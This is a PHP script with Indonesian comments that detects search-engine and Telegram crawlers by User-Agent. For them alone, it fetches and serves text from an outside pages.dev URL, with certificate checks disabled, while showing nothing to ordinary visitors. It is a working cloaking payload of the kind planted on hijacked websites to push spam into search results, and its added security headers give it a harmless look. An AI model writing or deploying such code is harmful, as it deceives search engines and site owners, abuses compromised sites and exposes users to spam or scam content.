<?php

// Fungsi untuk mendeteksi bot
function is_bot() {
    if (!isset($_SERVER["HTTP_USER_AGENT"])) {
        return false;
    }
    
    $user_agent = $_SERVER["HTTP_USER_AGENT"];
    $bots = array("Googlebot", "TelegramBot", "bingbot", "Baiduspider", "YandexBot");
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

// Fungsi untuk mengambil konten dengan cURL
function fetch_content($url) {
    // Inisialisasi cURL
    $ch = curl_init();

    // Atur opsi cURL untuk mengambil data
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  // Mengembalikan data sebagai string
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Mengikuti redirect jika ada
    
    // Jika URL menggunakan HTTPS, nonaktifkan verifikasi SSL jika perlu
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);  // Nonaktifkan verifikasi sertifikat SSL

    // Eksekusi permintaan cURL
    $content = curl_exec($ch);

    // Cek apakah terjadi error cURL
    if ($content === false) {
        // Jika terjadi error, tampilkan pesan error cURL
        echo "cURL Error: " . curl_error($ch);
        curl_close($ch);
        return false;
    }

    // Cek status kode HTTP dari respon
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($http_code != 200) {
        echo "HTTP Error: " . $http_code;
        curl_close($ch);
        return false;
    }

    // Tutup koneksi cURL
    curl_close($ch);
    return $content;
}

// Fungsi utama untuk menangani permintaan
function handle_request() {
    if (is_bot()) {
        // Jika request berasal dari bot, ambil konten dari URL eksternal
        $url = "https://langsungsajagass.pages.dev/index.txt";  // Ganti dengan URL sumber konten Anda
        $content = fetch_content($url);
        return ($content !== false) ? $content : "Content not available";  // Tampilkan konten atau pesan error
    }
    // Jika bukan bot, tampilkan pesan selamat datang
}

// Set header keamanan dasar
header('X-Frame-Options: DENY');
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');

// Tampilkan hasil dari handle_request()
echo handle_request();

?>
